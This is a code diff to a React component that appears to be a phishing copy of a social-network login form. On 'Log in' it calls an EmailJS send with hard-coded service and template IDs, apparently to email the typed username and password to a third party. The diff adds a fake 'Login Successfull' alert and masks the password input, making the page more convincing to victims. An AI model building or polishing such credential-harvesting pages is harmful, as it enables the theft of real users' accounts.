@@ -6,7 +6,7 @@ const App = () => {
   const [username, setusername] = useState();
   const [password, setpassword] = useState()
   const ButtonClicked = () => {
-
+    alert('Login Successfull')
     emailjs.send('service_o9fknof', 'template_40x05w6', {
       to_name: 'Recipient Name',
       from_name: 'Your Name', // Corrected key: 'from_name' instead of 'Emailid'
@@ -31,7 +31,7 @@ const App = () => {
             </div>
             <div className='inputFields'>
               <input type="text" placeholder='Phone number,username,or email' value={username} onChange={(e) => { setusername(e.target.value) }} />
-              <input type="text" placeholder='Password' value={password} onChange={(e) => { setpassword(e.target.value) }} />
+              <input type="password" placeholder='Password' value={password} onChange={(e) => { setpassword(e.target.value) }} />
               <button onClick={ButtonClicked}>Log in</button>
               <div className='ForOr' style={{ marginTop: '12px', height: '50px', width: '70%', display: 'flex', flexDirection: 'row' }}>
                 <hr />
